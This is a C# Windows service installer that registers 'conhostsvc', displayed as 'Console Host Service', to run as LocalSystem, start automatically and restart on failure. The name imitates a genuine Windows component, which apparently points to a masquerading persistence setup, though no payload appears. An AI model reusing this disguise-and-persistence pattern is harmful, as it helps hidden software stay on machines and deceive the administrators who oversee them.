using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.ServiceProcess;

namespace zort
{
    [RunInstaller(true)]
    public class ServiceInstaller : Installer
    {

        private readonly System.ServiceProcess.ServiceInstaller serviceInstaller;
        private readonly ServiceProcessInstaller processInstaller;

        public ServiceInstaller()
        {
            serviceInstaller = new System.ServiceProcess.ServiceInstaller();
            processInstaller = new ServiceProcessInstaller
            {
                Account = ServiceAccount.LocalSystem,
            };

            serviceInstaller.StartType = ServiceStartMode.Automatic;
            serviceInstaller.ServiceName = "conhostsvc";
            serviceInstaller.DisplayName = "Console Host Service";
            serviceInstaller.Description = "Provides console hosting capabilities for applications requiring background processing.";

            // Configure the service to always restart on failure
            serviceInstaller.ServicesDependedOn = new string[] { }; // Add dependencies if needed
            serviceInstaller.AfterInstall += (sender, args) =>
            {
                using (var process = new Process())
                {
                    process.StartInfo.FileName = "sc";
                    process.StartInfo.Arguments = $"failure \"{serviceInstaller.ServiceName}\" reset= 0 actions= restart/5000";
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.UseShellExecute = false;
                    process.Start();
                    process.WaitForExit();
                }
            };

            Installers.Add(serviceInstaller);
            Installers.Add(processInstaller);
        }
    }
}
